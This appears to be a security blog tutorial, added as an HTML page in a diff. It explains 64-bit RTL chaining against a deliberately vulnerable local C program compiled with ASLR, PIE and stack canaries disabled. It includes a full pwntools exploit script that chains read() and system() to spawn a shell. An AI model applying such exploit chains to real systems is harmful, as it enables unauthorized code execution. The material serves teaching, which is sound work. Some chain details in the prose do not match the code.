@@ -1,0 +1,209 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] RTL_Chaining · whrds.log</title><meta name="description" content="※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ RTL_Chaining is an attack technique that applies the RTL method to form a chain and execute it. Although it may not be clear yet what it means to &quot;form a chain,&quot; it will be used very importantly in ROP, which will be discussed next, so please try to understand it and move on.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-rtl-chaining/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rtl-chaining/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rtl-chaining/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] RTL_Chaining · whrds.log"><meta property="og:description" content="※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ RTL_Chaining is an attack technique that applies the RTL method to form a chain and execute it. Although it may not be clear yet what it means to &quot;form a chain,&quot; it will be used very importantly in ROP, which will be discussed next, so please try to understand it and move on."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-rtl-chaining/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] RTL_Chaining","description":"※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ RTL_Chaining is an attack technique that applies the RTL method to form a chain and execute it. Although it may not be clear yet what it means to \"form a chain,\" it will be used very importantly in ROP, which will be discussed next, so please try to understand it and move on.","datePublished":"2023-11-08","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-rtl-chaining/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-rtl-chaining/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] RTL_Chaining</h1><p class="article-description">※ If there are any incorrect parts, please let me know. I will check and make the necessary corrections. ※ RTL_Chaining is an attack technique that applies the RTL method to form a chain and execute it. Although it may not be clear yet what it means to &quot;form a chain,&quot; it will be used very importantly in ROP, which will be discussed next, so please try to understand it and move on.</p><div class="article-meta"><time datetime="2023-11-08">Nov 8, 2023</time><span>·</span><span>4 min read</span></div></header><div class="prose"><p><strong>※ If you find any incorrect parts, please let me know. I will check and make the necessary corrections.</strong>※</p>
+<p>RTL_Chaining is an attack technique that applies the RTL technique to form a chain and execute it.</p>
+<p>At this point, you might not fully understand what it means to “form a chain,” but</p>
+<p>since it will be very important in the upcoming ROP section, it is essential to understand it before moving on.</p>
+<p>As discussed in RTL, gadgets are needed.</p>
+<p>Since we will be conducting the practice in a 64-bit environment,</p>
+<p>we need to consider the six registers (rdi, rsi, rdx, rcx, r8, r9) used in the System V calling convention.</p>
+<p>First, since this technique does not bypass ASLR, I will disable this protection mechanism.</p>
+<pre><code>sudo sysctl -w kernel.randomize_va_space=0
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/001.png" alt=""></p>
+<p>The example code is as follows.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void provide_gadget() {
+    __asm__ (&quot;pop %r9&quot;);
+    __asm__ (&quot;pop %r8&quot;);
+    __asm__ (&quot;pop %rcx&quot;);
+    __asm__ (&quot;pop %rdx&quot;);
+    __asm__ (&quot;pop %rsi&quot;);
+    __asm__ (&quot;pop %rdi&quot;);
+    __asm__ (&quot;ret&quot;);
+    __asm__ (&quot;pop %rax&quot;);
+    __asm__ (&quot;ret&quot;);
+    __asm__ (&quot;pop %rbx&quot;);
+    __asm__ (&quot;ret&quot;);
+    __asm__ (&quot;mov %rbx, (%rax)&quot;);
+    __asm__ (&quot;ret&quot;);
+    __asm__ (&quot;mov %rax, (%rbx)&quot;);
+    __asm__ (&quot;ret&quot;);
+}
+
+int main(void)
+{
+    char buf[256];
+    read(0,buf,512);
+    printf(&quot;%s&quot;,buf);
+}
+</code></pre>
+<p>This is a code structure you might have seen before.</p>
+<p>Now, you can see that there is a buffer overflow vulnerability.</p>
+<p>Looking at the example above, since the system function does not exist, it might be unclear how to execute a shell.</p>
+<pre><code>gcc -no-pie -mpreferred-stack-boundary=4 -fno-stack-protector -fno-pie -o ex ex.c
+</code></pre>
+<p>I have disabled the protection mechanisms and compiled the code.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/002.png" alt=""></p>
+<p>As expected, the symbols for the system and execve functions are not loaded.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/003.png" alt=""></p>
+<p>What if this binary file is executed?</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/004.png" alt=""></p>
+<p>When the library file is loaded, it gains addresses for these functions.</p>
+<p>We need to exploit this point to carry out the attack.</p>
+<p>Can we assume that these addresses are immutable?</p>
+<p>The answer is obviously yes, because ASLR is disabled, so they are immutable.</p>
+<p>If ASLR is enabled, meaning the addresses are variable, then we need to perform a ROP attack.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/005.png" alt=""></p>
+<p>This is the process of checking memory values using vmmap.</p>
+<p>You can see that the address of libc_base is 0x00007ffff7d7f000.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/006.png" alt=""></p>
+<p>Now, calculating the difference between the system address and this value gives us 0x50d70.</p>
+<p>Now, I will check this in the referenced library file.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/007.png" alt=""></p>
+<p>Since the libc file is libc.so.6, we just need to check the absolute path /lib/x86_64-linux-gnu/libc.so.6.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/008.png" alt=""></p>
+<p>We can see that the offset of system is the same as the value obtained from the binary file we compiled.</p>
+<p>That is, each function can read information when the library file is referenced.</p>
+<hr>
+<p>Now, I will proceed with the attack practice.</p>
+<p>Since PIE is also disabled, we can easily obtain the plt and got addresses of the functions.</p>
+<p>There are various attack methods, but to better understand the bss segment,</p>
+<p>I will use the read function to input “/bin/sh”.</p>
+<p>Here, the addresses we need to obtain are as follows:</p>
+<ol>
+<li>
+<p>Obtain the addresses of read and system functions - function execution</p>
+</li>
+<li>
+<p>Obtain the gadgets for pppr and pr - chain construction</p>
+</li>
+<li>
+<p>Obtain the address of the bss segment - “/bin/sh” string</p>
+</li>
+</ol>
+<p>First, let me explain the scenario:</p>
+<ol>
+<li>
+<p>Use the read function to input ‘/bin/sh\x00’ into the bss segment.</p>
+</li>
+<li>
+<p>Use the pop rdi; ret; gadget to execute the system function.</p>
+</li>
+</ol>
+<p>Since there are only two steps, it is very simple.</p>
+<p>First, checking the buffer size, we can see it is 0x100.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/009.png" alt=""></p>
+<p>Now, I will gather the necessary materials.</p>
+<p>Obtaining the address of the read function - plt</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/010.png" alt=""></p>
+<p>Obtaining gadgets - rdi, rsi gadgets</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/011.png" alt=""></p>
+<p>Finding the bss address</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/012.png" alt=""></p>
+<p>Finding the system address</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/013.png" alt=""></p>
+<p>Summarizing the obtained values, we have the following:</p>
+<p>p_rdi = 0x0000000000401165</p>
+<p>p_rdi_rsi_rdx = 0x0000000000401163</p>
+<p>read@plt = 0x0000000000401060</p>
+<p>system@add = 0x7ffff7dcfd70</p>
+<p>bss = 0000000000404038</p>
+<p>Now, I will create the payload.</p>
+<pre><code>from pwn import*
+
+p = process('./ex')
+
+p_rdi = 0x0000000000401165
+p_rdi_rsi_rdx = 0x0000000000401163
+read_plt = 0x0000000000401060
+system_add = 0x7ffff7dcfd70
+bss = 0x0000000404038
+
+payload = b'A'*0x100
+payload += b'B'*0x8
+</code></pre>
+<p>So far, this is the same as previous attack techniques.</p>
+<p>Now, I will construct the chain, which consists of chains to execute the read and system functions.</p>
+<p>Looking at the read function first, it requires three arguments.</p>
+<p>Therefore, it needs the gadgets for the three registers rdi, rsi, and rdx.</p>
+<p>For the system function, since it only needs one argument, we can use the rdi gadget.</p>
+<p>The code we will implement is as follows.</p>
+<pre><code>read(0,bss,8);
+system(bss);
+</code></pre>
+<p>Incidentally, we have obtained gadgets that can modify all of rdi, rsi, and rdx from the gadgets.</p>
+<p>Now, we can construct the chain.</p>
+<p>p_rdi_rsi_rdx</p>
+<p>0</p>
+<p>bss</p>
+<p>8</p>
+<p>read@plt</p>
+<p>This form is the first chain.</p>
+<p>Then, the second chain.</p>
+<p>p_rdi</p>
+<p>bss</p>
+<p>system@add</p>
+<p>Once we have constructed all the chains, I will complete the payload.</p>
+<pre><code>from pwn import*
+
+p = process('./ex')
+
+p_rdi = 0x0000000000401165
+p_rdi_rsi_rdx = 0x0000000000401163
+read_plt = 0x0000000000401060
+system_add = 0x7ffff7dcfd70
+bss = 0x0000000404038
+
+payload = b'A'*0x100
+payload += b'B'*0x8
+
+#Chain1 - input /bin/sha
+payload += p64(p_rdi_rsi_rdx)
+payload += p64(0x8)
+payload += p64(bss)
+payload += p64(0x0)
+payload += p64(read_plt)
+
+#Chain2 - get shell
+payload += p64(p_rdi)
+payload += p64(bss)
+payload += p64(system_add)
+
+p.send(payload)
+
+p.send(b'/bin/sh\x00')
+
+p.interactive()
+</code></pre>
+<p>When executed, it will successfully obtain a shell.</p>
+<p><img src="/assets/images/tistory/tistory-98a777c41cfe/014.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-rtl-chaining/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
